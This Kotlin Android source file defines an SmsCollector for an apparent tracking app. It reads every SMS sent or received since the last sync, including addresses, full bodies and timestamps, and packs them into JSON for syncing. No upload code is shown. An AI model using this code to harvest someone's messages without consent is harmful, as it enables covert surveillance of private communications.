package com.takip.app.collector

import android.content.Context
import android.provider.Telephony
import org.json.JSONArray
import org.json.JSONObject
import java.time.Instant
import java.time.ZoneOffset
import java.time.format.DateTimeFormatter

object SmsCollector {
    private var lastSyncTime = 0L
    private var pendingSyncTime = 0L

    fun collect(context: Context): JSONArray {
        val array = JSONArray()
        pendingSyncTime = 0L
        val since = if (lastSyncTime > 0) lastSyncTime else System.currentTimeMillis() - 24 * 60 * 60 * 1000

        val cursor = context.contentResolver.query(
            Telephony.Sms.CONTENT_URI,
            arrayOf(
                Telephony.Sms.ADDRESS,
                Telephony.Sms.BODY,
                Telephony.Sms.TYPE,
                Telephony.Sms.DATE
            ),
            "${Telephony.Sms.DATE} > ?",
            arrayOf(since.toString()),
            "${Telephony.Sms.DATE} DESC"
        ) ?: return array

        cursor.use {
            while (it.moveToNext()) {
                val type = when (it.getInt(it.getColumnIndexOrThrow(Telephony.Sms.TYPE))) {
                    Telephony.Sms.MESSAGE_TYPE_INBOX -> "INCOMING"
                    Telephony.Sms.MESSAGE_TYPE_SENT -> "OUTGOING"
                    else -> "OTHER"
                }
                val dateMs = it.getLong(it.getColumnIndexOrThrow(Telephony.Sms.DATE))
                val timestamp = Instant.ofEpochMilli(dateMs)
                    .atOffset(ZoneOffset.UTC)
                    .format(DateTimeFormatter.ISO_INSTANT)

                array.put(JSONObject().apply {
                    put("address", it.getString(it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)) ?: "")
                    put("body", it.getString(it.getColumnIndexOrThrow(Telephony.Sms.BODY)) ?: "")
                    put("type", type)
                    put("timestamp", timestamp)
                })
                if (dateMs > pendingSyncTime) pendingSyncTime = dateMs
            }
        }
        return array
    }

    fun commitSync() {
        if (pendingSyncTime > lastSyncTime) lastSyncTime = pendingSyncTime
    }
}
